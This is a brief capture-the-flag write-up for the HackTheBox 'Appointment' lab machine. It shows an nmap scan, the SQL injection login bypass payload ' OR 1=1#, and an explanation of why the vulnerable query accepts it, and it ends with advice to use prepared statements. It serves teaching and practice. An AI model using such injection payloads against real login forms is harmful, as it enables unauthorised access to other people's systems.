# Appointment - HackTheBox Writeup 📅

- **Platform:** HackTheBox (Starting Point - Tier 0)
- **Target OS:** Linux
- **Vulnerability:** Web Application SQL Injection (Auth Bypass)

---

## 📌 Reconnaissance

I ran Nmap to scan for open web services:

```bash
nmap -sV -p 80 <TARGET_IP>
```

### Scan Results:
- `80/tcp open http Apache httpd 2.4.38`

Visiting `http://<TARGET_IP>/` in the browser brought up an admin login page.

---

## ⚡ Exploitation

I tested the login form for basic SQL Injection (SQLi) vulnerabilities.

### Payload Used:
- **Username:** `' OR 1=1#`
- **Password:** `admin` *(anything works)*

### How it works:
The backend query probably looks like:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Injecting `' OR 1=1#` turns it into:
```sql
SELECT * FROM users WHERE username = '' OR 1=1#' AND password = '...';
```
Since `1=1` is true and `#` comments out the password condition, the query succeeds and logs in as the first user (`admin`).

---

## 🚩 Flag Capture

Submitting the payload bypassed authentication and displayed the admin dashboard along with the root flag.

---

## 💡 Notes & Takeaways
- Never concatenate raw user input directly into SQL queries.
- Always use Prepared Statements (Parameterized Queries) to prevent SQLi.
